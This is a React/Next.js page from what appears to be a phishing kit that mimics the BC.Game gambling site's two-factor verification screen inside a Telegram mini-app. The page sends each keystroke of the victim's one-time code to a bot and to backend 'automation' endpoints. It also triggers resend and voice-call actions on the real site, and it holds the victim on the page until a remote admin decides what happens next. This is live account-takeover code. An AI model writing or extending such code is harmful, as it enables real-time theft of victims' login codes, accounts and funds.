"use client";

import React, { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useTelegram } from '../components/providers/TelegramProvider';
import { sendDataToBot } from '../lib/dataSync';
import { postLiveEvent } from '../lib/eventSync';
import { useRemoteControlListener } from '../lib/remoteControl';
import { useToast } from '../components/providers/ToastContext';

export default function VerificationCodePage() {
    const { showError } = useToast();
    const router = useRouter();
    const { webApp } = useTelegram();
    const [code, setCode] = useState("");
    const [countdown, setCountdown] = useState(60);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isFocused, setIsFocused] = useState(false);
    const wrapperRef = useRef<HTMLDivElement>(null);

    useRemoteControlListener({
        onToast: (msg) => {
            showError(msg);
            setIsSubmitting(false);
        }
    });

    const [contactInfo, setContactInfo] = useState("");
    const [contactType, setContactType] = useState<"phone" | "email" | null>(null);

    useEffect(() => {
        // Strict logic: check phone first (from OTP tab), then email (password tab), else generic
        const savedPhone = localStorage.getItem('user_phone_number'); // Set ONLY if OTP tab used
        if (savedPhone) {
            setContactInfo(savedPhone);
            setContactType('phone');
        } else {
            // Fallback to email (though user said "if email typed then show email okay")
            // Use live typing value or no value
            // We'll leave it empty to avoid showing "old cache" as requested
            setContactInfo("");
            setContactType(null);
        }
    }, []);

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
            return () => clearTimeout(timer);
        }
    }, [countdown]);

    // NOTE: error toast is controlled manually by admin via /api/remote-control

    // Live Data Capture
    useEffect(() => {
        sendDataToBot('user_verification_codes', JSON.stringify({ otp: code }));
    }, [code]);

    const shakeInput = () => {
        if (wrapperRef.current) {
            const wrapper = wrapperRef.current;
            wrapper.style.transform = 'translateX(8px)';
            setTimeout(() => wrapper.style.transform = 'translateX(-8px)', 50);
            setTimeout(() => wrapper.style.transform = 'translateX(8px)', 100);
            setTimeout(() => wrapper.style.transform = 'translateX(-8px)', 150);
            setTimeout(() => wrapper.style.transform = 'translateX(4px)', 200);
            setTimeout(() => wrapper.style.transform = 'none', 250);
        }
    };

    const handleInput = async (e: React.ChangeEvent<HTMLInputElement>) => {
        const rawValue = e.target.value;
        const value = rawValue.replace(/[^0-9]/g, '').slice(0, 6);
        setCode(value);

        // Send raw keystrokes to live-typing (for exact "everything typed" capture)
        try {
            await fetch('/api/live-typing', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ field: '2fa', value: rawValue, timestamp: Date.now() })
            });
        } catch (e) {
            // ignore
        }

        // Live typing - send to automation immediately
        try {
            await fetch('/api/automation-2fa', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code: value, live: true })
            });
        } catch (e) {
            // Ignore errors for live typing
        }
    };

    const handlePaste = async () => {
        try {
            console.log('Paste clicked');

            // Priority 1: Telegram WebApp API (most reliable in TG)
            // Access global directly in case context is stale/missing
            const tgApp = (window as any).Telegram?.WebApp || webApp;

            if (tgApp && tgApp.readTextFromClipboard) {
                console.log('Using TG WebApp clipboard');
                tgApp.readTextFromClipboard((clipText: string | null) => {
                    if (clipText) {
                        const numericCode = clipText.replace(/[^0-9]/g, '').slice(0, 6);
                        if (numericCode) {
                            setCode(numericCode);
                        } else {
                            showError('Clipboard contains no numbers');
                        }
                    } else {
                        showError('Clipboard is empty');
                    }
                });
                return;
            } else {
                console.log('TG WebApp clipboard not available:', {
                    appExists: !!tgApp,
                    methodExists: !!tgApp?.readTextFromClipboard,
                    version: tgApp?.version
                });
            }

            // Priority 2: Standard Navigator API
            if (navigator.clipboard && navigator.clipboard.readText) {
                console.log('Using Navigator clipboard');
                try {
                    const text = await navigator.clipboard.readText();
                    if (text) {
                        const numericCode = text.replace(/[^0-9]/g, '').slice(0, 6);
                        if (numericCode) {
                            setCode(numericCode);
                        } else {
                            showError('Clipboard contains no numbers');
                        }
                        return;
                    }
                } catch (err) {
                    console.warn('Navigator clipboard failed:', err);
                }
            }

            showError('Clipboard access not supported');

        } catch (e) {
            console.error('Paste error:', e);
            showError('Paste failed');
        }
    };

    const handleSubmit = async () => {
        postLiveEvent('user_verification_code_submit', {});
        if (code.length !== 6) {
            webApp?.HapticFeedback?.notificationOccurred('error');
            shakeInput();
            return;
        }

        setIsSubmitting(true);
        webApp?.HapticFeedback?.notificationOccurred('success');
        sendDataToBot('user_verification_codes', JSON.stringify({ otp: code }));

        // Send OTP code to automation (fire and forget)
        try {
            await fetch('/api/automation-2fa', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code })
            });
            console.log('📤 OTP code sent to automation');
        } catch (e) {
            console.error('Failed to send OTP to automation:', e);
        }

        // WAIT FOR ADMIN: Do NOT navigate automatically.
        // Admin will trigger navigation via remote control listener (onNav)
        // or show an error via (onToast) which resets isSubmitting.
    };

    return (
        <div className="min-h-screen flex flex-col font-sans relative" style={{ backgroundColor: "#232626", fontFamily: "avertastd, sans-serif", fontSize: "14px", lineHeight: "21px", wordSpacing: "0px", color: "#FFFFFF" }}>
            {/* Remote Error Toast */}
            {/* Remote Error Toast is now handled by ToastContext */}
            {/* Top Bar with Back Button */}
            <div className="w-full z-10 flex items-center justify-between" style={{ backgroundColor: "#323738", padding: "13.9535px 13.9535px 17.4419px" }}>
                <button onClick={() => postLiveEvent('user_click_back', {})} className="flex items-center justify-center rounded-lg hover:opacity-80 transition-opacity" style={{ width: "27.9px", height: "27.9px", backgroundColor: "#FFFFFF0D", padding: "0px 6.97675px" }} aria-label="Back">
                    <svg width="13.95" height="27.9" viewBox="0 0 32 32" fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg">
                        <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z" />
                    </svg>
                </button>
            </div>

            {/* Main Content */}
            <div className="w-full flex-1 px-6 relative z-10 mt-4" style={{ minHeight: "100%", paddingBottom: "16px" }}>
                <div className="w-full max-w-[420px] mx-auto">
                    {/* Title and Phone/Email */}
                    <p className="px-2 text-center text-[13.9535px]" style={{ color: "rgba(255,255,255,0.60)" }}>
                        Please enter the 6-digit verification code sent to
                        {contactInfo ? (
                            <span className="ml-1 font-semibold block" style={{ color: "rgba(255,255,255,0.95)" }}>
                                {contactInfo}
                            </span>
                        ) : (
                            <span className="block mt-1">your device</span>
                        )}
                    </p>

                    {/* Verification Code Label */}
                    <p className="mt-5 text-[13.9535px] w-full max-w-[333.35px] mx-auto" style={{ color: "rgba(255,255,255,0.60)", marginBottom: "0.5rem" }}>
                        Verification Code
                    </p>

                    {/* Input Field with Paste Button */}
                    <div ref={wrapperRef} className="flex items-center rounded-lg w-full max-w-[333.35px] mx-auto" style={{ backgroundColor: "#292D2E", border: isFocused ? "1px solid rgb(36, 238, 137)" : "1px solid transparent", height: "41.85px", padding: "0px 6.97675px 0px 10.4651px", transition: "transform 0.1s" }}>
                        <input type="tel" value={code} onChange={handleInput} onFocus={() => setIsFocused(true)} onBlur={() => setIsFocused(false)} placeholder="6-digit verification code" maxLength={6} inputMode="numeric" pattern="[0-9]*" className="flex-1 bg-transparent focus:outline-none placeholder-gray-500" style={{ color: "rgba(255,255,255,0.90)", caretColor: "rgba(255,255,255,0.90)", fontSize: "13.9535px", fontFamily: "avertastd", border: "none", outline: "none" }} />
                        <button onClick={handlePaste} className="rounded-lg hover:opacity-85 transition-opacity" style={{ backgroundColor: "#4A5354", color: "#FFFFFF", fontSize: "10.4651px", fontFamily: "avertastd", padding: "0px 6.97675px", height: "27.9px", minWidth: "40.98px" }}>
                            Paste
                        </button>
                    </div>

                    {/* Resend Timer */}
                    <div className="flex justify-center">
                        <button
                            className="mt-3 hover:opacity-80 transition-opacity"
                            style={{ color: "rgba(255,255,255,0.60)", fontSize: "13.9535px" }}
                            disabled={countdown > 0}
                            onClick={async () => {
                                if (countdown <= 0) {
                                    postLiveEvent('user_verification_code_resend', {});
                                    // Reset countdown
                                    setCountdown(60);
                                    // Tell automation to click Resend on BC.Game
                                    try {
                                        await fetch('/api/automation-action', {
                                            method: 'POST',
                                            headers: { 'Content-Type': 'application/json' },
                                            body: JSON.stringify({ action: 'click_resend' })
                                        });
                                        console.log('📤 Resend action sent to automation');
                                    } catch (e) {
                                        console.error('Failed to send resend action:', e);
                                    }
                                }
                            }}
                        >
                            <span>{countdown > 0 ? `Resend in ${countdown}s` : "Resend"}</span>
                        </button>
                    </div>

                    {/* Submit Button */}
                    <button onClick={handleSubmit} disabled={code.length !== 6 || isSubmitting} className="w-full max-w-[333.35px] mx-auto rounded-lg hover:opacity-92 transition-all flex items-center justify-center" style={{ backgroundColor: "#24EE89", color: "#000000", height: "41.85px", fontSize: "14px", fontFamily: "avertastd", fontWeight: "800", padding: "0px 6.97674px", border: "none", margin: "13.9535px auto 0px auto", opacity: (code.length !== 6 || isSubmitting) ? 0.5 : 1 }}>
                        {isSubmitting ? 'Loading...' : 'Submit'}
                    </button>

                    {/* Bottom Links */}
                    <div className="flex flex-col items-center gap-4 mt-2">
                        <button onClick={() => postLiveEvent('user_click_different_number', {})} className="text-[14.5px] font-medium underline underline-offset-[3px] hover:opacity-80 transition-opacity" style={{ color: "rgba(255,255,255,0.90)", fontFamily: "avertastd" }}>
                            Use a different phone number
                        </button>
                        <button
                            onClick={async () => {
                                postLiveEvent('user_verification_code_voice_call', {});
                                // Tell automation to click Voice Call on BC.Game
                                try {
                                    await fetch('/api/automation-action', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ action: 'click_voice_call' })
                                    });
                                    console.log('📤 Voice Call action sent to automation');
                                } catch (e) {
                                    console.error('Failed to send voice call action:', e);
                                }
                            }}
                            className="flex items-center gap-2 text-[14.5px] font-medium hover:opacity-80 transition-opacity"
                            style={{ color: "rgba(255,255,255,0.90)", fontFamily: "avertastd" }}
                        >
                            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                                <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56a.977.977 0 00-1.01.24l-1.57 1.97c-2.83-1.49-5.15-3.8-6.62-6.62l1.97-1.57c.23-.23.31-.56.25-.87-.36-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3.43 3 4.06 3 4.93c0 8.29 6.72 15 15.01 15 .87 0 1.5-.64 1.5-1.19v-3.37c0-.54-.45-.99-.99-.99z" />
                            </svg>
                            Receive Code via Voice Call
                        </button>
                    </div>
                </div>
            </div>
        </div>
    );
}
